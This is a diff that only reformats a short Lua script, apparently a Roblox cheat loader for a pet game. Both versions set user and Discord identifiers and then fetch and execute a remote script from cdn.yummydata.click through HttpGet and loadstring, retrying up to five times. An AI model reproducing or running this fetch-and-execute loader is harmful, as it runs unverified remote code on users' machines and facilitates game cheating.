@@ -1,1 +1,12 @@
-_G.Config={UserID="85a00e19-30eb-4b2f-acfd-a9634446a76c",discord_id="1067392103585423440",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/pet99"))()end)if s then break end wait(5)end
+_G.Config = {
+    UserID = "85a00e19-30eb-4b2f-acfd-a9634446a76c",
+    discord_id = "1067392103585423440",
+    Note = "Pc"
+}
+
+for i = 1, 5 do
+    if pcall(function()
+        loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/pet99"))()
+    end) then break end
+    wait(5)
+end
